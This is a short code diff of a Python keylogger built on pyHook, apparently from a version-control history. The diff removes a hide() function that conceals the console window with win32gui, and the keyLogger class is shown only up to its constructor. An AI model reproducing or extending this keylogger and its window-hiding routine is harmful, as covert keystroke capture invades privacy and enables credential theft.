@@ -1,12 +1,6 @@
 import pyHook
 import pythoncom
 
-def hide():
-    import win32console,win32gui
-    window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window,0)
-    return True
-
 class keyLogger:
 
     def __init__(self,path):
